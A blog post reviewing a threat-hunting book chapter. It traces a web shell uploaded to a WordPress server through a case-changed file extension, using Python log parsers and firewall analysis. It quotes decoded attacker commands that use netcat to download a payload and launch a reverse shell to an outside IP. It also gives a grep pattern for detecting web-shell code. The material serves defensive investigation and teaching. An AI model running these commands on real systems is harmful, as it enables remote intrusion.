# Threat Intel 4 Threat Hunt

I’m continuing the series of reviewing the book [Cyber Threat Hunting](https://www.manning.com/books/cyber-threat-hunting), by Nadhem AlFardan, published by Manning. If you haven’t read the one before, I strongly suggest you reading the [previous post](https://lucavauda.bearblog.dev/my-first-threat-hunting-expedition/), as they are strongly correlated.

You will fine the specific files for the chapter in question at this [link](https://github.com/lucavauda/CyberThreatHunting_TechReview/tree/main/chapter4) (my GitHub repo).

This is Chapter 4 called **Threat Intelligence for Threat Hunting**.

## **Threat Intelligence for Threat Hunting**

### Context

In this chapter, other teams are involved. The teams suggested that a possible vulnerability that allows attackers to upload web shells. We receive a report from one of them:

> The threat intelligence report describes the active exploitation of a recently announced vulnerability in a WordPress plugin deployed in a self-hosted production web server the organization hosts on a public cloud service provider.
> 

So the context is that we have a web-application, running with WordPress, with a possible piece of code that could run a Remote Code Execution (RCE). The vulnerability is [**CVE-2021-24347**](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://nvd.nist.gov/vuln/detail/CVE-2021-24347&ved=2ahUKEwijkq2a6riMAxWn8LsIHXuqIlgQFnoECAIQAQ&usg=AOvVaw3O33GkuFql6RBa3dL7kPWr), here’s a brief description from NIST: 

> The SP Project & Document Manager WordPress plugin before 4.22 allows users to upload files, however, the plugin attempts to prevent php and other similar files that could be executed on the server from being uploaded by checking the file extension. It was discovered that php files could still be uploaded by changing the file extension's case, for example, from "php" to "pHP".
> 

The timeline we are given is the following:

- January 10: The system administrator created the account in question, supplier007, and provided the user access to the WordPress projects portal.
- April 10: The system administrator installed the vulnerable version of the plugin on the WordPress server
- June 2: The credentials of the account, *supplier007*, were posted for sale on the dark web.
- June 14: The plugin vulnerability, CVE-2021-24347, was made public.
- June 18: The system administrator installed a new plugin version.
- June 22: The external cyber threat intelligence provider informed the threat intelligence team about a compromised account, *supplier007*.
- June 23: The threat intelligence team shared the threat intelligence report with the threat hunter

The two sources of data we will analyze are the Apache2 web access events from the web server hosting the WordPress site and the firewall events for inbound and outbound connections to and from the web server.

Other information are not reported but are available in the book in more details.

### Threat Hunt

Our first attempt should be looking at logs that indicates malicious upload attempts. 

Last time I used PowerShell to write the queries in this book, for the following chapters I will try to use Python, in order to filter the desired results and turn them automatically into a JSON format (Claude, my best friend surely will help doing so). This query will search for Apache2 access events and extract filenames in web requests. 

```python
import re
import json
from collections import Counter

# Define the regex to parse the log line.
log_pattern = re.compile(
    r'^(\S+) \S+ \S+ \[(.*?)\] "(\S+) (\S+) (\S+)" (\d+) \d+ ".*?" ".*?"$'
)
# This pattern captures:
#   Group 1: IP
#   Group 2: timestamp
#   Group 3: HTTP method
#   Group 4: path
#   Group 5: protocol (e.g., HTTP/1.1)
#   Group 6: status

# Regex for extracting the filename from the path (similar to the Humio regex).
filename_pattern = re.compile(r"(?P<filename>\w+\.\w+)")

# A counter to group and count occurrences of each filename.
filename_counter = Counter()

# Open and process the log file.
with open("ch4_web_access_events.log", "r") as file:
    for line in file:
        line = line.strip() # Removes the any leading, and trailing whitespaces.
        match = log_pattern.match(line)
        if match:
            ip, timestamp, method, path, protocol, status = match.groups()
            # Emulate the replace command:
            # In the Humio query, this step removes the substring "HTTP/1.1" from the field 'path'
            # and stores the result in 'path_only'. In our parsed data, 'path' comes directly from the log,
            # but we simulate the replacement if needed.
            path_only = re.sub(r"HTTP\/1\.1", "", path)

            # Extract the filename using the provided regex.
            filename_match = filename_pattern.search(path_only)
            if filename_match:
                filename = filename_match.group("filename")
                filename_counter[filename] += 1

# Sort the results by count in descending order.
sorted_results = sorted(
    filename_counter.items(), key=lambda item: item[1], reverse=True
)

# Format the result as a list of dictionaries.
result = [{"filename": fname, "count": count} for fname, count in sorted_results]

# Write the result to a JSON file.
with open("result_query1.json", "w") as json_file:
    json.dump(result, json_file, indent=4)

print("JSON file 'result_query1.json' created successfully.")
```

This script will be heavy-lifted by AI. I am not proficient in Python and still learning, but the value I get from LLMs are too much to not use them. Let’s break down the code.

We have to define a regex pattern (`log_pattern`) to parse Apache log lines into components like IP address, timestamp, HTTP method, path, etc. The compile method `re.compile()` , it is used as it compiles the regex pattern more efficiently when used multiple times (note: the `r` prefix creates a raw string, which is useful for regex patterns since backslashes don't need to be escaped). 

- `^(\S+)`: Starts with one or more non-whitespace characters (captures the IP address)
- `\S+ \S+`: Two groups of non-whitespace characters (typically identd and userid, often "-" in logs) that aren't captured
- `\[(.*?)\]`: Content inside square brackets (captures the timestamp)
- `"(\S+) (\S+) (\S+)"`: Three space-separated items inside quotes:
    - First item: HTTP method (GET, POST, etc.)
    - Second item: Requested URL path
    - Third item: Protocol (typically HTTP/1.1)
- `(\d+)`: Capture a sequence of digits (the HTTP status code)
- `\d+`: Another sequence of digits (response size in bytes) that isn't captured
- `".*?" ".*?"`: Two quoted strings (typically the referrer URL and user agent) that aren't captured
- `$`: End of line

Then, in order to extract filenames from URLs, let’s analyze the second regex:

- `(?P<filename>...)`: Creates a named capture group called "filename"
- `\w+`: One or more word characters (letters, digits, underscores) for the filename
- `\.`: A literal period character
- `\w+`: One or more word characters for the file extension

So, it opens a file called "`ch4_web_access_events.log`”, and for each line in the log file:

- Matches the line against the log pattern
- Extracts the components (IP, timestamp, method, path, etc.)
- Removes "HTTP/1.1" from the path if present
- Uses the filename pattern to extract filenames from the path
- Counts occurrences of each filename using Counter

After sorting it in descending order, it formats the results as a list of dictionaries with "filename" and "count" keys. At the end, the results are in the `result_query1.json` file. The results are not really compelling. In fact, not only are really different from the one to the book, they are also not relevant to our search. A the author points out:

> The search output contains filenames extracted from the Apache web access events. The result indicates that the names of the uploaded files are not captured in the web access events. Instead, the events capture web requests made to the Apache web server, for example, requests to ajax.php and login.php.
> 

Like the previous chapter, we are not seeing names of uploaded files. The first hunt if not successful, suggest us to change the approach. Let’s search web request to the vulnerable plugin, in particular to the directory called `uploads/sp-client-document-manager/3`.

Now, the query should focus on the plugin upload directory, printing out the time, status and path_only:

```python
import re
import json
from datetime import datetime

def parse_log_file(file_path):
    log_pattern = re.compile(
        r'^(\S+) \S+ \S+ \[(.*?)\] "(\S+) (\S+) (\S+)" (\d+) \d+ ".*?" ".*?"$'
    )
    entries = []

    with open(file_path, "r") as f:
        for line in f:
            line = line.strip()
            match = log_pattern.match(line)
            if not match:
                continue  # Skip malformed lines

            # Extract relevant components
            timestamp_str = match.group(2)
            path = match.group(4)
            status = match.group(6)

            # Apply path filter
            if "/uploads/sp-client-document-manager/3/project-plan.php" not in path:
                continue

            # Clean path (remove HTTP version if present)
            clean_path = path.replace("HTTP/1.1", "").strip()

            # Parse and format timestamp
            try:
                log_date = datetime.strptime(timestamp_str, "%d/%b/%Y:%H:%M:%S %z")
                formatted_time = log_date.strftime("%Y/%m/%d %H:%M:%S")
            except ValueError:
                continue  # Skip lines with invalid timestamps

            entries.append(
                {"time": formatted_time, "status": status, "path_only": clean_path}
            )

    # Sort entries chronologically
    entries.sort(key=lambda x: datetime.strptime(x["time"], "%Y/%m/%d %H:%M:%S"))

    return entries

# Process the log file and save results
results = parse_log_file("ch4_web_access_events.log")

with open("result_query2.json", "w") as f:
    json.dump(results, f, indent=2)

print("JSON file 'result_query2.json' created successfully.")
```

After spending hours analyzing Python code and JSON files, I noticed that the timestamps in the log file provided by the author do not match those in the book’s results. The log entries in the author-provided file exclusively span the period **22 December 2021 to 3 January 2022**, yet the reference results in the text demonstrate outputs dated **17 June 2021**. As a result, even though my script correctly processes the data, I cannot replicate the exact outputs shown in the book simply because those specific log entries do not exist in my dataset. 

**To continue my review and analysis, I will refer to the book’s results as a reference.**

Considering one of the result, we notice that one the request is a long string, probably indicating a Base64 encoding. So after the decoding base64 queries, we notice some UNIX command executed, indicating that the adversary is aware of the o.s. of the web server (90% is Linux, so that was a good guess). 

**Summary of what we discovered so far**:

1. After successfully uploading a web shell called "`project-plan.php`" (possibly using the supplier007 account), the attacker first ran the `whoami` command (discovered after decoding a base64 string) to identify what user privileges they had on the system.
2. The attacker attempted to download additional tools using `wget` and `curl` commands, but these attempts failed. This suggests these tools aren't installed on the compromised system - something that should be verified with the system administrator.
3. Next, the attacker checked for alternative file transfer methods and discovered that netcat (nc) was available. System administrators later confirmed that while wget and curl are indeed unavailable, netcat is installed. This finding should be noted for later security recommendations.
4. Using netcat, the attacker transferred content to the server and saved it as "project-plan" in the /tmp directory.
5. The attacker then executed this "project-plan" file with specific parameters:
    - "/bin/bash" (to run a shell)
    - IP address "34.152.29.228" and port "80" (connection destination)
    - "`--reconn`" flag (likely to automatically reconnect if disconnected)
6. The lack of further logged events suggests the attacker established a new communication channel through the executed file, moving their activities outside the original access point.
7. Notably, the attacker named their malicious files to blend in with the legitimate purpose of the web server, making detection more difficult.

So, after this brief recap, here’s the actual timeline of events:

- @ 17/06/2021 08:00:49: Web Request including `project-plan.php` with Base64 encoding

In the books there’s a reference of a TOR exit nodes: there doesn't seem to be enough information to conclude that TOR was involved in this particular attack sequence yet. For this reason, I will not include it.

The author reminds us that a threat hunter in this situation would update his previous incident case, alerting the incident response team (it’s a team sport).

One thing I could’ve written better in the previous chapter were questions-related tasks. So let’s write them in this format:

- [ ]  Do we know when `project-plan.php` file was uploaded?
- [ ]  Do we know who uploaded it?
- [ ]  What is the content of `/tmp/project-plan`?
- [ ]  Have we checked if outbound connections were successful?

After a communication with the sys admin who gave us really important info, we discover that **all log files were created on June 16**, the same day as the suspicious requests, strongly suggests **log tampering**. The attacker likely **deleted previous logs** to cover their tracks. Since the logs are located in `/var/log/apache2`, which is typically **owned by root**, **deleting logs requires root privileges**. This indicates that the attacker has **gained root-level access**, which is **extremely dangerous**. The current log file permissions allow **only root to modify them**, preventing normal users from reviewing or restoring logs.

The 3 in the URL path we have seen earlier, `/wp-content/uploads/sp-client-document-manager/3`, has been confirmed by the sys admin that is the supplier007, the request came from him (likely a compromised account) and he uploaded the file `project-plan.php`. 

Also, the sys admin shares with us that the tmp folder is empty, so the previous goal cannot be achieved. 

- [x]  Do we know who uploaded it? → The administrator replied to your request and identified supplier007 as user number 3
- [x]  What is the content of `/tmp/project-plan`? → tmp folder empty 😞

The when task can be achieved analyzing the firewall log using a not-so-trivial query. We’ll take a look at **inbound connections** logged by the cloud provider firewall.

The reasoning behind it is the following:

> Reviewing the complete list of connections is time-consuming. We should get a manageable number of network connections if we restrict our search to:
- A few minutes (for example 10) before and after the time of the first suspicious web access event containing the Base64 encoded whoami command;
- Web requests destined to TCP ports 80 and 443; and
- Look for traffic destined to one of the nodes hosting the web portal pods.
> 

The output of the search shows a total of 35 connections using TCP/443, after a geolocalization query, this is the following output:

> 185.220.100[.]250 located in DE (country code for Germany), with 33 connections
134.209.24[.]42 located in GB (country code for Great Britain), with 1 connection
139.162.145[.]250 located in DE, with 1 connection
> 

A VirusTotal check on the IP addresses is performed, revealing that 185.220.100[.]250 has been tagged as a TOR node (so the information on the timeline could be updated). TOR hides the true identity of the attacker, so we will not be able to know who the attacker is.

Ok now let’s investigate the **outbound connections**. The time frame of reference is 10 minutes before and after the first suspicious web access events (whoami command).

The output shows a total of 109 connections.

> The following is a summary. The events source IP addresses, 10.154.0[.]2, 10.154.0[.]3 or 10.154.0[.]4, are the three Kubernetes nodes that host the web server pods. 
From the output, we see the following outbound connections which correlate to the Base64 decoded commands sent to the Web shell:
- "10.154.0[.]4","34.125.53[.]119","80","1": One connection that correlate with the command `sleep 10 | nc -v 34.125.53.119 80 > /tmp/project-plan && chmod 755 /tmp/project-plan`.
- "10.154.0.4","34.152.29.228","80","3": Three connections which correlates with the command `/tmp/project-plan -e '/bin/bash' 34.152.29.228 80 --reconn`. We see three connections, despite seeing one web access event. This could be due to the --reconn parameter, which might have instructed the program project-plan to reconnect whenever its connection to 34.152.29.228 is lost. It could also be other activities performed by the attacker on the compromised system.
> 

After that, we can tick another of our task we were set to do. We checked outbound connection and we found 4 successful from suspicious servers.

- [x]  Have we checked if outbound connections were successful? → Yes, a total of 4 suspicious outbound connection were made.

A careful reader might have notice that the task of discovering when PHP file was uploaded, we did not solve it. This is because after a checking the outbound, we have no clear sign of it, we discover two events that might correlate to the adversary uploading the file. So, at the end, we have our hypothesis but no evidence. 

### Exercises for this chapter

For this chapter, we have two question related to the file **`project-plan.php`**. You can find it on my GitHub [repo](https://github.com/lucavauda/CyberThreatHunting_TechReview/tree/main/chapter4). The PHP file is intentionally `project-plan.pHp` (with mixed-case extension) rather than `.php`. This links with the exact attack methodology described in CVE-2021-24347, where attackers bypass security checks by altering the case of restricted file extensions. The exercises were done with the help of Claude. 

**Question 1: How could access to the content of `project-plan.php` assist in the hunt expedition?**

Having directly the file helps the threat hunter in different ways:

1. **Identifying the attack method**: The file reveals this is a web shell that allows remote command execution through browser-based interactions.
2. **Understanding the obfuscation technique**: The shell uses Base64 encoding to obfuscate commands, which helps avoid detection by simple pattern matching security tools.
3. **Command execution mechanism**: The PHP code shows exactly how commands are being executed (`exec($decoded_command)`) and displayed to the attacker.
4. **Evidence collection**: With the source code, you can determine what system commands were executed by looking at server logs for requests containing Base64-encoded parameters to this file.
5. **Attribution**: The code style and implementation details might match known threat actor techniques, helping with attribution.
6. **Developing IOCs**: You can create signatures based on this file to detect similar web shells or access patterns in your environment.

**Question 2: What Linux command would you use to perform a search that looks for instances where legitimate php files on the server were modified to include some of the code contained in this web shell.**

You can use `grep` with regex to target code patterns from the web shell. Example command:

```bash
grep -r --include="*.php" "exec\s*(\s*\$.*\$_GET\|base64_decode\|str_repeat" /var/www/
```

The command:

- Searches recursively (`r`) through the web directory
- Only examines PHP files (`-include="*.php"`)
- Looks for key patterns found in the web shell:
    - `exec` function calls with variables
    - References to `$_GET` parameters
    - Use of `base64_decode`
    - `str_repeat` function (which is less common in legitimate code)

### Conclusion

To be honest, I didn’t enjoy this chapter that much for a very specific reason: the data provided wasn’t the same as in the book. That’s OK, I think when dealing with real life, having the data already set up is a luxury not for every one. That said, I found the PHP vulnerability particularly interesting, and I learned a lot throughout the process. The real value of this chapter is at the end of the chapter, where the Threat Hunt Play is written, giving the reader a really condense summary of what our research looked like.
